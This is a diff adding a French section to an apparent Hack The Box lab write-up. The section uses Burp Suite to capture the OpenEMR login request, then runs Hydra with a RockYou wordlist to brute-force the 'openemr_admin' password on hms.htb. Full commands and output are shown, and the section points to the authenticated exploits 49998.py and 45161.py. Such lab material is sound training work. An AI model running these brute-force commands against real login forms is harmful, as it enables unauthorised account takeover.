@@ -1033,6 +1033,188 @@ Tu disposes désormais d’un nom d’utilisateur OpenEMR valide. En revanche, l
 
 La prochaine étape consiste donc à analyser précisément le formulaire de connexion d’OpenEMR afin de préparer une recherche du mot de passe de `openemr_admin`.
 
+### Identification des paramètres Hydra avec Burp Suite
+
+Pour trouver le mot de passe du compte `openemr_admin`, tu vas utiliser **Hydra** afin de tester automatiquement une liste de mots de passe sur le formulaire de connexion d’OpenEMR.
+
+Pour une présentation plus générale de l’outil et de son utilisation avec les formulaires HTTP `POST`, tu peux consulter ce tutoriel en français [Hydra Cheat Sheet](https://hackops.fr/hydra-cheat-sheet/).
+
+Hydra doit connaître :
+
+- le nom d’utilisateur ;
+- la liste de mots de passe à tester ;
+- la cible ;
+- l’URL vers laquelle les identifiants sont envoyés ;
+- les champs transmis dans la requête ;
+- un marqueur permettant de reconnaître un échec d’authentification.
+
+Pour récupérer tous ces éléments, tu interceptes une tentative de connexion avec Burp Suite en utilisant le compte `openemr_admin` et un mot de passe volontairement incorrect, puis tu envoies la requête dans **Repeater**.
+
+![Tentative de connexion OpenEMR avec un mauvais mot de passe dans Burp Suite](hms-htb-loginbad-password-burp-suite.png)
+
+La requête utilise la méthode `POST` vers :
+
+```text
+/interface/main/main_screen.php?auth=login&site=default
+```
+
+
+
+Son corps contient les paramètres suivants :
+
+```bash
+new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=test
+```
+
+Le nom d’utilisateur étant déjà connu, seule la valeur de `clearPass` devra varier pendant l’attaque Hydra :
+
+```bash
+clearPass=^PASS^
+```
+
+La partie correspondant aux données du formulaire devient donc :
+
+```bash
+new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=^PASS^
+```
+
+La réponse à cette tentative incorrecte contient l’instruction JavaScript suivante :
+
+```bash
+w.top.location.href = '/interface/login_screen.php?error=1&site=';
+```
+
+Le texte `error=1` est donc un marqueur fiable d’échec d’authentification. La condition à utiliser avec Hydra sera :
+
+```
+F=error=1
+```
+
+
+
+### Attaque par dictionnaire avec Hydra
+
+Les éléments nécessaires à la construction de la commande Hydra sont maintenant connus :
+
+```text
+Utilisateur        : openemr_admin
+Cible              : hms.htb
+Méthode            : POST
+URL                 : /interface/main/main_screen.php?auth=login&site=default
+Champ utilisateur  : authUser
+Champ mot de passe : clearPass
+Marqueur d’échec   : error=1
+```
+
+
+
+Avant d’utiliser une wordlist volumineuse, il est préférable de vérifier la commande avec une courte liste de mots de passe :
+
+```bash
+mkdir -p hydra
+
+cat > hydra/test-passwords.txt <<'EOF'
+test
+password
+admin
+H@v3_fun
+EOF
+```
+
+Cette première liste ne vise pas encore à trouver le mot de passe. Elle permet surtout de confirmer que Hydra reproduit correctement la requête observée dans Burp Suite et interprète correctement le marqueur d’échec.
+
+Tu lances le test avec :
+
+```bash
+hydra -l openemr_admin \
+  -P hydra/test-passwords.txt \
+  hms.htb \
+  http-post-form \
+  '/interface/main/main_screen.php?auth=login&site=default:new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=^PASS^:F=error=1' \
+  -t 1 \
+  -V
+```
+
+L’option `-l` précise le nom d’utilisateur déjà connu, tandis que `-P` indique le fichier contenant les mots de passe à tester.
+
+Le module `http-post-form` demande ensuite trois éléments séparés par des deux-points :
+
+```text
+<URL>:<données envoyées>:<condition d’échec>
+```
+
+Dans cette commande :
+
+```url
+/interface/main/main_screen.php?auth=login&site=default
+```
+
+correspond à l’URL appelée par le formulaire ;
+
+```bash
+new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=^PASS^
+```
+
+reproduit le corps de la requête `POST`, Hydra remplaçant `^PASS^` par chaque mot de passe de la liste ;
+
+```bash
+F=error=1
+```
+
+indique que la présence de `error=1` dans la réponse correspond à un échec d’authentification.
+
+L’option `-t 1` limite Hydra à une seule tâche simultanée pendant cette phase de validation, tandis que `-V` affiche chaque tentative effectuée.
+
+Voici le résultat :
+
+```bash
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at [date]
+[DATA] max 1 task per 1 server, overall 1 task, 4 login tries (l:1/p:4), ~4 tries per task
+[DATA] attacking http-post-form://hms.htb:80/interface/main/main_screen.php?auth=login&site=default:new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=^PASS^:F=error=1
+[ATTEMPT] target hms.htb - login "openemr_admin" - pass "test" - 1 of 4 [child 0] (0/0)
+[ATTEMPT] target hms.htb - login "openemr_admin" - pass "password" - 2 of 4 [child 0] (0/0)
+[ATTEMPT] target hms.htb - login "openemr_admin" - pass "admin" - 3 of 4 [child 0] (0/0)
+[ATTEMPT] target hms.htb - login "openemr_admin" - pass "H@v3_fun" - 4 of 4 [child 0] (0/0)
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at [date]
+
+```
+
+Comme la petite wordlist ne contient pas a priori le mot de passe recherché, Hydra traite correctement chacune de ses entrées comme un échec. 
+
+La syntaxe de la commande et le marqueur `F=error=1` sont donc validés.
+
+Tu peux maintenant préparer une liste plus importante en extrayant les 10 000 premiers mots de passe de RockYou :
+
+```bash
+head -n 10000 /usr/share/wordlists/rockyou.txt \
+  > hydra/rockyou-10000.txt
+```
+
+Tu relances ensuite Hydra avec cette nouvelle liste :
+
+```bash
+hydra -l openemr_admin \
+  -P hydra/rockyou-10000.txt \
+  hms.htb \
+  http-post-form \
+  '/interface/main/main_screen.php?auth=login&site=default:new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=^PASS^:F=error=1' \
+  -t 1 \
+  -V
+```
+
+L’attaque peut prendre plusieurs minutes, notamment selon la vitesse de réponse du serveur et la position du mot de passe dans la liste. 
+
+Hydra finit par identifier un mot de passe valide pour le compte :
+
+```text
+openemr_admin:xxxxxx
+```
+
+Tu disposes désormais des identifiants nécessaires pour tester les exploits OpenEMR authentifiés `49998.py` et `45161.py`.
+
 
 
 ## Escalade de privilèges
